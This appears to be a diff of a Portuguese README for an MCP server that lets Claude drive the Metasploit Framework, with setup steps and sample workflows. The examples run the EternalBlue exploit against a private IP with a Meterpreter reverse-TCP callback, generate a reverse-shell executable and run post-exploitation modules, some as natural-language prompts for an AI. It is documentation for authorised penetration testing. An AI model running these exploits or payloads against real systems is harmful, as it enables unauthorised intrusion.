@@ -2,64 +2,78 @@
 
 Um servidor MCP (Model Context Protocol) para integração com o Metasploit Framework no Kali Linux.
 
+## Demonstração
+
+![Metasploit MCP Demo](docs/demo.gif)
+
+*Exemplo de uso do Metasploit MCP com Claude Desktop*
+
 ## Descrição
 
-Este servidor MCP fornece uma ponte entre modelos de linguagem como o Claude e a plataforma de teste de penetração Metasploit Framework. Permite que assistentes de IA acessem e controlem dinamicamente as funcionalidades do Metasploit através de ferramentas padronizadas, habilitando uma interface de linguagem natural para fluxos de trabalho complexos de testes de segurança.
+Este servidor MCP fornece uma ponte entre modelos de linguagem grandes como o Claude e a plataforma de teste de penetração Metasploit Framework. Permite que assistentes de IA acessem e controlem dinamicamente as funcionalidades do Metasploit através de ferramentas padronizadas, habilitando uma interface de linguagem natural para fluxos de trabalho complexos de testes de segurança.
 
 ## Funcionalidades
 
 ### Informações de Módulos
-
-- **list_exploits**: Buscar e listar módulos de exploit disponíveis no Metasploit
+- **list_exploits**: Buscar e listar módulos de exploit disponíveis do Metasploit
 - **list_payloads**: Buscar e listar módulos de payload disponíveis com filtragem opcional por plataforma e arquitetura
 
 ### Fluxo de Exploração
-
 - **run_exploit**: Configurar e executar um exploit contra um alvo com opções para executar verificações primeiro
-- **run_auxiliary_module**: Executar qualquer módulo auxiliar do Metasploit com opções customizadas
+- **run_auxiliary_module**: Executar qualquer módulo auxiliar do Metasploit com opções personalizadas
 - **run_post_module**: Executar módulos pós-exploração contra sessões existentes
 
 ### Geração de Payloads
-
 - **generate_payload**: Gerar arquivos de payload usando RPC do Metasploit (salva arquivos localmente)
 
 ### Gerenciamento de Sessões
-
 - **list_active_sessions**: Mostrar sessões atuais do Metasploit com informações detalhadas
 - **send_session_command**: Executar um comando em uma sessão shell ou Meterpreter ativa
 - **terminate_session**: Finalizar forçadamente uma sessão ativa
 
 ### Gerenciamento de Handlers
-
 - **list_listeners**: Mostrar todos os handlers ativos e jobs em background
 - **start_listener**: Criar um novo multi/handler para receber conexões
 - **stop_job**: Terminar qualquer job ou handler em execução
 
 ## Pré-requisitos
 
-- Metasploit Framework instalado e msfrpcd em execução
-- Kali Linux (ou distribuição baseada em Debian)
-- Python 3.10 ou superior
-- Pacotes Python necessários (veja requirements.txt)
+- **Sistema Operacional**: Kali Linux 2023.1+ (ou Debian/Ubuntu)
+- **Metasploit Framework**: Versão 6.0+
+- **Python**: 3.10 ou superior
+- **Dependências**: Pacotes Python necessários (veja requirements.txt)
 
-## Instalação
+## Instalação no Kali Linux
 
-### 1. Preparar o Sistema
+### 1. Atualizar Sistema
 
 ```bash
-# Atualizar sistema (Kali Linux)
 sudo apt update && sudo apt upgrade -y
+```
 
+### 2. Verificar Metasploit
+
+```bash
 # Verificar se Metasploit está instalado
 msfconsole --version
 
 # Se não estiver instalado:
 sudo apt install metasploit-framework
+```
 
+### 3. Preparar Python
+
+```bash
 # Verificar Python
 python3 --version
-2. Configurar o Projeto
-bash
+
+# Instalar dependências do sistema se necessário
+sudo apt install python3 python3-pip python3-venv git
+```
+
+### 4. Clonar e Configurar
+
+```bash
 # Clonar repositório
 git clone https://github.com/seu-usuario/metasploit-mcp-server.git
 cd metasploit-mcp-server
@@ -72,95 +86,132 @@ source venv/bin/activate
 
 # Instalar dependências
 pip install -r requirements.txt
-3. Configurar Variáveis de Ambiente (opcional)
-bash
-# Criar arquivo .env ou exportar variáveis
-export MSF_PASSWORD=suasenha
-export MSF_SERVER=127.0.0.1
-export MSF_PORT=55553
-export MSF_SSL=false
-export PAYLOAD_SAVE_DIR=/home/kali/payloads  # Opcional: onde salvar payloads gerados
-Uso
-Iniciar o Serviço RPC do Metasploit
-bash
-# Iniciar msfrpcd (deixe rodando em um terminal)
-msfrpcd -P suasenha -S -a 127.0.0.1 -p 55553
-Opções de Transporte
+```
+
+### 5. Configurar Variáveis de Ambiente
+
+```bash
+# Criar arquivo .env (opcional)
+cat > .env << EOF
+MSF_PASSWORD=yourpassword
+MSF_SERVER=127.0.0.1
+MSF_PORT=55553
+MSF_SSL=false
+PAYLOAD_SAVE_DIR=/home/kali/payloads
+EOF
+
+# Ou exportar diretamente
+export MSF_PASSWORD=yourpassword
+export PAYLOAD_SAVE_DIR=/home/kali/payloads
+```
+
+## Configuração do Metasploit RPC
+
+### Iniciar msfrpcd
+
+```bash
+# Terminal 1 - Iniciar o daemon RPC (deixe rodando)
+msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
+
+# Verificar se está rodando
+ps aux | grep msfrpcd
+netstat -tlnp | grep 55553
+```
+
+### Testar Conexão
+
+```bash
+# Testar conexão manual
+telnet 127.0.0.1 55553
+
+# Ou usando curl
+curl -X POST http://127.0.0.1:55553/api/ \
+  -H "Content-Type: application/json" \
+  -d '{"method":"auth.login","params":["yourpassword"]}'
+```
+
+## Uso do Servidor MCP
+
+### Opções de Transporte
+
 O servidor suporta dois métodos de transporte:
 
-HTTP/SSE (Server-Sent Events): Modo padrão para interoperabilidade com a maioria dos clientes MCP
-STDIO (Standard Input/Output): Usado com Claude Desktop e conexões diretas similares
-Você pode selecionar explicitamente o modo de transporte usando a flag --transport:
-
-bash
-# Executar com transporte HTTP/SSE (padrão)
-python MetasploitMCP.py --transport http
-
-# Executar com transporte STDIO
-python MetasploitMCP.py --transport stdio
-Opções adicionais para modo HTTP:
-
-bash
+**HTTP/SSE (Server-Sent Events)** - Padrão para interoperabilidade:
+```bash
 python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
-Integração com Claude Desktop
-Para integração com Claude Desktop, configure o arquivo ~/.config/Claude/claude_desktop_config.json:
+```
 
-json
+**STDIO (Standard Input/Output)** - Para Claude Desktop:
+```bash
+python MetasploitMCP.py --transport stdio
+```
+
+### Integração com Claude Desktop (Kali Linux)
+
+Editar arquivo de configuração:
+```bash
+nano ~/.config/Claude/claude_desktop_config.json
+```
+
+Configuração para Kali Linux:
+```json
 {
     "mcpServers": {
         "metasploit": {
-            "command": "/home/kali/caminho/para/metasploit-mcp-server/venv/bin/python",
+            "command": "/home/kali/metasploit-mcp-server/venv/bin/python",
             "args": [
-                "/home/kali/caminho/para/metasploit-mcp-server/MetasploitMCP.py",
+                "/home/kali/metasploit-mcp-server/MetasploitMCP.py",
                 "--transport",
                 "stdio"
             ],
             "env": {
-                "MSF_PASSWORD": "suasenha"
+                "MSF_PASSWORD": "yourpassword",
+                "PAYLOAD_SAVE_DIR": "/home/kali/payloads"
             }
         }
     }
 }
-Outros Clientes MCP
-Para outros clientes MCP que usam HTTP/SSE:
+```
 
-Iniciar o servidor em modo HTTP:
-bash
+### Para Outros Clientes MCP
+
+Iniciar em modo HTTP:
+```bash
 python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
-Configurar seu cliente MCP para conectar em:
-Endpoint SSE: http://seu-servidor-ip:8085/sse
-Considerações de Segurança
-⚠️ AVISO IMPORTANTE DE SEGURANÇA:
+```
+
+Endpoint SSE: `http://your-kali-ip:8085/sse`
+
+## Considerações de Segurança
+
+### ⚠️ AVISO IMPORTANTE DE SEGURANÇA
 
 Esta ferramenta fornece acesso direto às capacidades do Metasploit Framework, que incluem recursos poderosos de exploração. Use com responsabilidade e apenas em ambientes onde você tem permissão explícita para realizar testes de segurança.
 
-Sempre valide e revise todos os comandos antes da execução
-Execute apenas em ambientes de teste segregados ou com autorização adequada
-Esteja ciente de que comandos pós-exploração podem resultar em modificações significativas do sistema
-Exemplos de Fluxos de Trabalho
-Exploração Básica
-Listar exploits disponíveis: list_exploits("ms17_010")
-Selecionar e executar exploit: run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})
-Listar sessões: list_active_sessions()
-Executar comandos: send_session_command(1, "whoami")
-Pós-Exploração
-Executar módulo post: run_post_module("windows/gather/enum_logged_on_users", 1)
-Enviar comandos customizados: send_session_command(1, "sysinfo")
-Finalizar quando terminar: terminate_session(1)
-Gerenciamento de Handler
-Iniciar listener: start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)
-Listar handlers ativos: list_listeners()
-Gerar payload: generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})
-Parar handler: stop_job(1)
-Exemplos de Uso com Claude Desktop
-Comandos em Linguagem Natural
+### Boas Práticas
+
+- **Autorização**: Sempre valide e revise todos os comandos antes da execução
+- **Ambiente**: Execute apenas em ambientes de teste segregados ou com autorização adequada
+- **Impacto**: Esteja ciente de que comandos pós-exploração podem resultar em modificações significativas do sistema
+- **Rede**: Use apenas em redes isoladas ou de laboratório
+- **Logs**: Mantenha logs detalhados de todas as atividades
+
+## Exemplos de Uso com Claude Desktop
+
+### Comandos em Linguagem Natural
+
+```
 "Liste exploits relacionados ao SMB"
 "Execute o exploit MS17-010 contra o host 192.168.1.100"
 "Mostre as sessões ativas"
-"Execute o comando 'systeminfo' na sessão 1"
+"Execute o comando 'whoami' na sessão 1"
 "Gere um payload reverse TCP para Windows x64"
 "Inicie um listener na porta 4444"
-Fluxo Completo de Pentesting
+```
+
+### Fluxo Completo de Pentesting
+
+```
 "Busque exploits para Windows SMB e execute contra 192.168.1.50 usando um payload meterpreter reverse TCP no meu IP 192.168.1.10 porta 4444"
 
 "Liste as sessões ativas e execute 'getuid' na primeira sessão"
@@ -168,124 +219,233 @@ Fluxo Completo de Pentesting
 "Execute o módulo de enumeração de usuários logados na sessão ativa"
 
 "Gere um payload executável Windows x64 com LHOST 192.168.1.10 e LPORT 5555"
-Testes
-Este projeto inclui testes unitários e de integração abrangentes para garantir confiabilidade e manutenibilidade.
+```
 
-Pré-requisitos para Testes
-Instalar dependências de teste:
+## Exemplos de Fluxos de Trabalho
 
-bash
+### Exploração Básica
+
+1. **Descoberta**: `list_exploits("ms17_010")`
+2. **Exploração**: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
+3. **Verificação**: `list_active_sessions()`
+4. **Execução**: `send_session_command(1, "whoami")`
+
+### Pós-Exploração
+
+1. **Enumeração**: `run_post_module("windows/gather/enum_logged_on_users", 1)`
+2. **Comandos**: `send_session_command(1, "sysinfo")`
+3. **Limpeza**: `terminate_session(1)`
+
+### Gerenciamento de Handler
+
+1. **Listener**: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
+2. **Verificação**: `list_listeners()`
+3. **Payload**: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
+4. **Parar**: `stop_job(1)`
+
+## Testes
+
+### Instalação de Dependências de Teste
+
+```bash
+# Ativar ambiente virtual
+source venv/bin/activate
+
+# Instalar dependências de teste
 pip install -r requirements-test.txt
-Ou usar o instalador conveniente:
 
-bash
+# Ou usar instalador
 python run_tests.py --install-deps
-# OU
-make install-deps
-Executar Testes
-Comandos Rápidos
-bash
-# Executar todos os testes
+```
+
+### Executar Testes
+
+```bash
+# Todos os testes
 python run_tests.py --all
-# OU
-make test
 
-# Executar com relatório de cobertura
+# Com cobertura
 python run_tests.py --all --coverage
-# OU
-make coverage
 
-# Executar com relatório HTML de cobertura
-python run_tests.py --all --coverage --html
-# OU
-make coverage-html
-Suítes de Teste Específicas
-bash
-# Apenas testes unitários
+# Testes específicos
 python run_tests.py --unit
-# OU
-make test-unit
-
-# Apenas testes de integração
 python run_tests.py --integration
-# OU
-make test-integration
+```
 
-# Testes de parsing de opções
-python run_tests.py --options
-# OU
-make test-options
+### Estrutura de Testes
 
-# Testes de funções auxiliares
-python run_tests.py --helpers
-# OU
-make test-helpers
+- `tests/test_options_parsing.py` - Testes de parsing de opções
+- `tests/test_helpers.py` - Testes de funções auxiliares
+- `tests/test_tools_integration.py` - Testes de integração MCP
+- `conftest.py` - Configuração de fixtures
+- `pytest.ini` - Configuração do pytest
 
-# Testes de ferramentas MCP
-python run_tests.py --tools
-# OU
-make test-tools
-Opções de Configuração
-Diretório de Salvamento de Payloads
-Por padrão, payloads gerados com generate_payload são salvos em um diretório payloads na sua pasta home (~/payloads). Você pode personalizar esta localização definindo a variável de ambiente PAYLOAD_SAVE_DIR.
+## Configuração Avançada
 
-Definindo a variável de ambiente:
+### Diretório de Payloads
 
-bash
-# No terminal (temporário)
-export PAYLOAD_SAVE_DIR=/home/kali/meus-payloads
+Personalizar localização dos payloads:
 
-# No arquivo ~/.bashrc (permanente)
-echo 'export PAYLOAD_SAVE_DIR=/home/kali/meus-payloads' >> ~/.bashrc
+```bash
+# Variável temporária
+export PAYLOAD_SAVE_DIR=/home/kali/custom-payloads
+
+# Permanente no .bashrc
+echo 'export PAYLOAD_SAVE_DIR=/home/kali/custom-payloads' >> ~/.bashrc
 source ~/.bashrc
 
-# Na configuração do Claude Desktop:
-json
-"env": {
-    "MSF_PASSWORD": "suasenha",
-    "PAYLOAD_SAVE_DIR": "/home/kali/meus-payloads"
-}
-Nota: Se você especificar um caminho customizado, certifique-se de que ele existe ou que a aplicação tem permissão para criá-lo. Se o caminho for inválido, a geração de payload pode falhar.
+# Criar diretório com permissões
+mkdir -p /home/kali/custom-payloads
+chmod 755 /home/kali/custom-payloads
+```
 
-Solução de Problemas
-msfrpcd não inicia
-bash
-# Verificar se a porta está em uso
+### Configuração de Rede
+
+Para acesso remoto ao MCP:
+
+```bash
+# Permitir conexões externas
+python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
+
+# Configurar firewall se necessário
+sudo ufw allow 8085
+```
+
+## Solução de Problemas
+
+### msfrpcd não inicia
+
+```bash
+# Verificar porta em uso
 sudo netstat -tlnp | grep 55553
 
-# Matar processo se necessário
+# Matar processo existente
 sudo pkill msfrpcd
 
 # Iniciar novamente
-msfrpcd -P suasenha -S -a 127.0.0.1 -p 55553
-Erro de conexão
-bash
-# Verificar se o serviço está rodando
+msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
+```
+
+### Erro de conexão
+
+```bash
+# Verificar serviço
 ps aux | grep msfrpcd
 
-# Testar conexão manualmente
+# Verificar logs
+tail -f ~/.msf4/logs/framework.log
+
+# Testar conectividade
 telnet 127.0.0.1 55553
-Permissões de diretório
-bash
-# Criar diretório de payloads com permissões adequadas
-mkdir -p ~/payloads
+```
+
+### Permissões de arquivo
+
+```bash
+# Corrigir permissões do diretório de payloads
 chmod 755 ~/payloads
-Compatibilidade
-Metasploit Framework: 6.0+
-Kali Linux: 2023.1+
-Python: 3.10+
-Claude Desktop: Versões com suporte MCP
-Licença
+
+# Corrigir permissões do projeto
+chmod +x MetasploitMCP.py
+```
+
+### Problemas com Claude Desktop
+
+```bash
+# Verificar configuração
+cat ~/.config/Claude/claude_desktop_config.json
+
+# Verificar logs do Claude Desktop
+tail -f ~/.config/Claude/logs/main.log
+
+# Testar servidor manualmente
+python MetasploitMCP.py --transport stdio
+```
+
+## Compatibilidade
+
+- **Metasploit Framework**: 6.0+
+- **Kali Linux**: 2023.1+
+- **Debian/Ubuntu**: 20.04+
+- **Python**: 3.10+
+- **Claude Desktop**: Versões com suporte MCP
+
+## Contribuindo
+
+1. Faça fork do projeto
+2. Crie uma branch para sua feature:
+   ```bash
+   git checkout -b feature/nova-funcionalidade
+   ```
+3. Commit suas mudanças:
+   ```bash
+   git commit -am 'Adiciona nova funcionalidade'
+   ```
+4. Push para a branch:
+   ```bash
+   git push origin feature/nova-funcionalidade
+   ```
+5. Abra um Pull Request
+
+## Recursos Adicionais
+
+### Scripts Úteis
+
+Criar script de inicialização:
+```bash
+cat > start_metasploit_mcp.sh << 'EOF'
+#!/bin/bash
+# Script para iniciar Metasploit MCP
+
+# Iniciar msfrpcd
+echo "Iniciando msfrpcd..."
+msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553 &
+
+# Aguardar inicialização
+sleep 5
+
+# Ativar ambiente virtual e iniciar MCP
+cd /home/kali/metasploit-mcp-server
+source venv/bin/activate
+python MetasploitMCP.py --transport stdio
+
+echo "Metasploit MCP iniciado!"
+EOF
+
+chmod +x start_metasploit_mcp.sh
+```
+
+### Logs e Monitoramento
+
+```bash
+# Monitorar logs do Metasploit
+tail -f ~/.msf4/logs/framework.log
+
+# Monitorar processos
+watch 'ps aux | grep -E "(msfrpcd|MetasploitMCP)"'
+
+# Verificar conexões
+watch 'netstat -tlnp | grep 55553'
+```
+
+## Licença
+
 Apache 2.0
 
-Contribuindo
-Faça fork do projeto
-Crie uma branch para sua feature (git checkout -b feature/nova-funcionalidade)
-Commit suas mudanças (git commit -am 'Adiciona nova funcionalidade')
-Push para a branch (git push origin feature/nova-funcionalidade)
-Abra um Pull Request
-Links Relacionados
-Metasploit Framework
-Model Context Protocol
-Claude Desktop
-Kali Linux
+## Links Relacionados
+
+- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
+- [Model Context Protocol](https://modelcontextprotocol.io)
+- [Claude Desktop](https://claude.ai)
+- [Kali Linux](https://www.kali.org)
+- [Documentação Metasploit](https://docs.metasploit.com/)
+
+## Suporte
+
+Para relatar bugs ou solicitar recursos:
+- Abra uma [issue](https://github.com/seu-usuario/metasploit-mcp-server/issues)
+- Entre em contato via [discussions](https://github.com/seu-usuario/metasploit-mcp-server/discussions)
+
+---
+
+**⚠️ Lembre-se: Use esta ferramenta apenas em ambientes autorizados para testes de penetração!**
